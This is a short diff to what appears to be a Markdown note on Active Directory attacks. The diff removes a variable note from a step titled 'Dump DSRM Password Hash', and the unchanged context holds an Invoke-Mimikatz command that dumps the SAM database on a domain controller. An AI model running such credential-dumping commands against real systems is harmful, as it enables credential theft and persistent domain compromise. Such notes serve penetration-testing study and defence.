@@ -16,9 +16,6 @@ ___
 
 # <span style="color:#FF5555">Step 1: Dump DSRM Password Hash</span>
 
-> [!info] Variables used below
-> - `$DC_IP` – Domain Controller's IP
-
 ```powershell
 # Get the local SAM database (where DSRM password lives)
 Invoke-Mimikatz -Command '"token::elevate" "lsadump::sam"' -ComputerName $DC_IP
